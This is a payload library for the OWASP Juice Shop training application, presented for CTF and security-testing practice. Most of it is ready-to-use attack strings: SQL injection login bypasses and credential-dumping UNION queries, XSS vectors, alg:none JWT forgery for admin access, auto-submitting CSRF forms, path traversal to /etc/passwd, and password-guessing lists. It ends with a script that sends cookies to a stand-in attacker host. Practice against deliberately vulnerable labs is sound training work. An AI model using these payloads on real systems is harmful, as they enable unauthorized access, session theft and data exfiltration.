# OWASP Juice Shop Payloads Library

Comprehensive payloads for exploiting OWASP Juice Shop vulnerabilities. This file is designed for hands-on application security testing, CTF preparation, and DevSecOps practice.

---

## 1. SQL Injection Payloads

These payloads target insecure SQL concatenation used in authentication and search functionality.

### 1.1 Basic Authentication Bypass

```
' OR 1=1--
```

### 1.2 Login as First User

```
' OR TRUE--
```

### 1.3 Extract User Table

```
' UNION SELECT null, email, password, null FROM Users--
```

### 1.4 Dump Email and Password Fields

```
1 UNION SELECT 1,2,3,4,email,password FROM Users--
```

### 1.5 Blind SQL Injection Boolean-Based

```
1' AND 1=1--
1' AND 1=2--
```

### 1.6 Delay-Based SQLi

```
1' OR SLEEP(5)--
```

---

## 2. Cross-Site Scripting (XSS) Payloads

Juice Shop contains reflected, stored, and DOM-based XSS vulnerabilities.

### 2.1 Simple Script Alert

```
<script>alert('XSS')</script>
```

### 2.2 Image Onerror Execution

```
"><img src=x onerror=alert(1)>
```

### 2.3 SVG Stored XSS Payload

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
```

### 2.4 Iframe Injection

```
<iframe src="javascript:alert('XSS')"></iframe>
```

### 2.5 DOM-Based XSS (Search Bar)

```
"><script>confirm(document.cookie)</script>
```

---

## 3. JWT Manipulation Payloads

Used to exploit insecure JWT validation and the `alg:none` weakness.

### 3.1 Unsigned JWT Header

```
{
  "alg": "none",
  "typ": "JWT"
}
```

### 3.2 Admin Privilege Escalation Payload

```
{
  "email": "admin@juice-sh.op",
  "role": "admin"
}
```

### 3.3 Token Tampering Example

```
eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

---

## 4. CSRF Exploitation Payloads

Cross-site request forgery attacks on unprotected endpoints.

### 4.1 Automatic Account Creation

```
<form action="http://localhost:3000/api/Users" method="POST">
  <input type="hidden" name="email" value="victim@juice-shop.local">
  <input type="hidden" name="password" value="Password123!">
</form>
<script>document.forms[0].submit()</script>
```

### 4.2 CSRF Password Change Payload

```
<form action="http://localhost:3000/rest/user/change-password" method="POST">
  <input type="hidden" name="new" value="newpass123">
</form>
<script>document.forms[0].submit()</script>
```

---

## 5. API Manipulation Payloads

These payloads exploit insecure input validation in Juice Shop's API layer.

### 5.1 Negative Quantity Attack (Business Logic Abuse)

```
{
  "BasketId": 1,
  "ProductId": 1,
  "quantity": -500
}
```

### 5.2 Force Admin Role via API

```
{
  "role": "admin"
}
```

### 5.3 Manipulate Review Rating

```
{
  "message": "Excellent",
  "rating": 9999
}
```

---

## 6. Path Traversal Payloads

Used to extract sensitive files.

### 6.1 Basic Traversal

```
../../../../etc/passwd
```

### 6.2 Encoded Traversal

```
..%2F..%2F..%2Fetc%2Fpasswd
```

---

## 7. File Upload Exploitation Payloads

Target weak MIME validation and inadequate sanitization.

### 7.1 XSS SVG Upload

```
<svg onload="alert('XSS')"></svg>
```

### 7.2 Polyglot File

```
<?php echo 'test'; ?>
<script>alert(1)</script>
```

(Note: Juice Shop does not execute server-side code, but polyglots demonstrate validation weaknesses.)

---

## 8. Directory Enumeration Payloads

Useful for fuzzing hidden routes.

### 8.1 Common Paths

```
/ftp
/.git
/administration
/api
/rest
```

### 8.2 Fuzzing Wordlist Example

```
/admin
/backup
/server-status
/api/users
```

---

## 9. Authentication and Session Payloads

### 9.1 Weak Password List

```
123456
password
admin123
letmein
juice
```

### 9.2 Sample Burp Intruder Payload Set

```
admin
administrator
root
superuser
manager
```

---

## 10. Miscellaneous Test Payloads

### 10.1 HTML Injection

```
<b>Injected</b>
```

### 10.2 Template Injection Indicators

```
{{7*7}}
${7*7}
<%= 7 * 7 %>
```

### 10.3 JavaScript Fetch Exploit (Exfiltration Example)

```
<script>
fetch('http://attacker.local/?cookie=' + document.cookie)
</script>
```

---
